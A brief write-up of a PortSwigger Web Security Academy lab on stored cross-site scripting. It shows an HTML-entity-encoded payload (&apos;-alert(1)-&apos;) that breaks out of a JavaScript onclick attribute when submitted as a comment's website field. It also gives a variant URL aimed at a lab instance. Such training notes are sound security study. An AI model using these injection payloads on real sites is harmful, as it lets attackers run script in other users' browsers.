**Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped**

```
http://foo?&apos;-alert(1)-&apos;
```

From <https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped> 


Post on comment section and than you can click on the image to xss
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/112b4bd1-cd35-4908-bfb3-ec5990576bee)







We can also use 
```
https://0a720085047a86048149f7810017003d.web-security-academy.net/?'-alert(1)-'
```
